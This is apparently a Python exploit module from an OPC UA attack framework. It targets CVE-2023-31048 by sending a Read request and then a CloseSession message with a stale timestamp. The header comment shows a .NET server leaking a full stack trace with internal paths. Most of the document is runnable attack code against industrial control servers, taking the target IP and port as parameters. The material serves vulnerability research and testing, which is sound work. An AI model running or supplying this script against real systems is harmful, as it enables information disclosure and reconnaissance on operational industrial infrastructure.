# Send Close Message with Bad Timestamp Attack
# In some OPCUA stacks we will get a full stacktrace with interesting info. For example in .NET:
#   b'MSGF\xcd\x08\x00\x00N\x11\x02\x00\x01\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00\x01\x00\x8d\x01A\x9di\x8a\xf7\x12\xd9\x017\x00\x00\x00\x00\x00#\x80t
#       \x00\x00\x00\x00\xb2\x06\x00\x00
#       >>> BadInvalidTimestamp\r\n---    at Opc.Ua.Server.SessionManager.ValidateRequest(RequestHeader requestHeader, RequestType requestType) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Session\\SessionManager.cs:line 492\r\n---    at Opc.Ua.Server.StandardServer.ValidateRequest(RequestHeader requestHeader, RequestType requestType) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Server\\StandardServer.cs:line 2579\r\n---    at Opc.Ua.Server.StandardServer.CloseSession(RequestHeader requestHeader, Boolean deleteSubscriptions) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Server\\StandardServer.cs:line 764\r\n---    at Opc.Ua.SessionEndpoint.CloseSession(IServiceRequest incoming) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Stack\\Opc.Ua.Core\\Stack\\Generated\\Opc.Ua.Endpoints.cs:line 723\r\n---    at Opc.Ua.EndpointBase.ServiceDefinition.Invoke(IServiceRequest request) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Stack\\Opc.Ua.Core\\Stack\\Server\\EndpointBase.cs:line 591\r\n---    at Opc.Ua.EndpointBase.ProcessRequestAsyncResult.OnProcessRequest(Object state) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Stack\\Opc.Ua.Core\\Stack\\Server\\EndpointBase.cs:line 857\r\n\r\n>>> BadInvalidTimestamp\r\n---    at Opc.Ua.Server.Session.ValidateRequest(RequestHeader requestHeader, RequestType requestType) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Session\\Session.cs:line 414\r\n---    at Opc.Ua.Server.SessionManager.ValidateRequest(RequestHeader requestHeader, RequestType requestType) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Session\\SessionManager.cs:line 474\x00\x00#\x80\x14\x00\x00\x00\x00\xc3\x01\x00\x00>>> BadInvalidTimestamp\r\n---    at Opc.Ua.Server.Session.ValidateRequest(RequestHeader requestHeader, RequestType requestType) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Session\\Session.cs:line 414\r\n---    at Opc.Ua.Server.SessionManager.ValidateRequest(RequestHeader requestHeader, RequestType requestType) in C:\\Users\\user\\Desktop\\UA-.NETStandard-1.4.371.41\\Libraries\\Opc.Ua.Server\\Session\\SessionManager.cs:line 474\x01\x00\x00\x00\x13\x00\x00\x00BadInvalidTimestamp\x00\x00\x00'
#
# CVEs:
#  	- CVE-2023-31048: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2023-31048.pdf
#
import datetime

from protocol import *
from config import *

def attack(server_details):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # Prepare message
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=631)
    message_body += struct.pack("<Q", 0) # Max age
    message_body += struct.pack("<I", 3) # Timestamp to return (3 = Neither)

    # Nodes to read (array of 12 NodeIDs)
    nodes_to_read = bytes.fromhex("0c0000000100b73a05000000ffffffff0000ffffffff0100b93a05000000ffffffff0000ffffffff0100203e05000000ffffffff0000ffffffff0100df3c05000000ffffffff0000ffffffff01001a3d05000000ffffffff0000ffffffff01001e3d05000000ffffffff0000ffffffff0100263d05000000ffffffff0000ffffffff01002a3d05000000ffffffff0000ffffffff005e05000000ffffffff0000ffffffff01002e3c05000000ffffffff0000ffffffff005f05000000ffffffff0000ffffffff01005b0105000000ffffffff0000ffffffff")
    message = message_header + message_body + nodes_to_read

    # Send num_requests times
    print("[-] Sending MSG Request - Read Array of 12 NodeIDs x {} times".format(1))
    opcua.send_recv(message, count=1, should_recv=True)

    time.sleep(0.2)

    # Close connection
    print("[-] Closing connection")
    opcua.close_connection(should_wait=True, use_old_timestap=True, should_print_result=True)
    opcua.sock.close()
